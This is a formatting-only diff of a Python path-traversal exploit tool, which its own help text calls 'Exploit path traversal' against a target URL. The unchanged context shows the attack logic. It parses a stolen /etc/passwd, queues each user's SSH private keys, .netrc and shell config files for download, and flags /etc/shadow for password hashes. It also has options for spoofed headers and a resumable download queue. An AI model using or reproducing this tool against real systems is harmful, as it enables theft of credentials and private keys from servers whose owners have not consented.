@@ -77,6 +77,7 @@ def filehandler(pattern):
     def decorator(function):
         handlers[pattern] = function
         return function
+
     return decorator
 
 
@@ -98,26 +99,28 @@ def passwd(content):
             parts = line.split(":")
             homedir = parts[5]
             assert_is_path(homedir)
-            queue |= {os.path.join(homedir, f) for f in [
-                ".netrc",
-                ".ssh/id_rsa",
-                ".ssh/config",
-                ".ssh/authorized_keys",
-                ".ssh/known_hosts",
-                ".ssh/id_ed25519",
-                ".bash_logout",
-                ".bash_profile",
-                ".bashrc",
-            ]}
+            queue |= {
+                os.path.join(homedir, f)
+                for f in [
+                    ".netrc",
+                    ".ssh/id_rsa",
+                    ".ssh/config",
+                    ".ssh/authorized_keys",
+                    ".ssh/known_hosts",
+                    ".ssh/id_ed25519",
+                    ".bash_logout",
+                    ".bash_profile",
+                    ".bashrc",
+                ]
+            }
         except (IndexError, NotFilePathError):
             pass
     return queue
 
 
-
 @filehandler("/etc/shadow")
 def shadow(content):
-    if content.startswith(b'root'):
+    if content.startswith(b"root"):
         print("* Shadow file potentially contains password hashes")
 
 
@@ -156,7 +159,9 @@ class Spider:
         self.queue_file = os.path.join(self.save_dir, ".queue.txt")
 
         self.done = read_file(self.done_file)
-        self.queue = read_file(args.filelist) | read_file(self.queue_file) | set(args.paths)
+        self.queue = (
+            read_file(args.filelist) | read_file(self.queue_file) | set(args.paths)
+        )
         self.queue -= self.done
 
     def save_state(self):
@@ -195,17 +200,43 @@ class Spider:
 
 def parse_arguments():
     parser = argparse.ArgumentParser(description="Exploit path traversal")
-    parser.add_argument("-H", "--header", dest="headers", default=[], action="append", help="Extra header (e.g. \"X-Forwarded-For: 127.0.0.1\")")
-    parser.add_argument("-o", "--output-dir", dest="save_dir", default="out", help="Save files to this directory")
-    parser.add_argument("-f", "--filelist", dest="filelist", default="filelist.txt", help="File with a list of paths to download")
-    parser.add_argument("-p", "--path", dest="paths", default=[], action="append", help="Add this path to the download queue")
+    parser.add_argument(
+        "-H",
+        "--header",
+        dest="headers",
+        default=[],
+        action="append",
+        help='Extra header (e.g. "X-Forwarded-For: 127.0.0.1")',
+    )
+    parser.add_argument(
+        "-o",
+        "--output-dir",
+        dest="save_dir",
+        default="out",
+        help="Save files to this directory",
+    )
+    parser.add_argument(
+        "-f",
+        "--filelist",
+        dest="filelist",
+        default="filelist.txt",
+        help="File with a list of paths to download",
+    )
+    parser.add_argument(
+        "-p",
+        "--path",
+        dest="paths",
+        default=[],
+        action="append",
+        help="Add this path to the download queue",
+    )
     parser.add_argument("url", help="URL to attack")
     return parser.parse_args()
 
 
 def path_to_absolute(save_dir, path_in_save_dir):
     assert path_in_save_dir.startswith(save_dir)
-    return path_in_save_dir[len(save_dir.rstrip('/')):]
+    return path_in_save_dir[len(save_dir.rstrip("/")) :]
 
 
 if __name__ == "__main__":
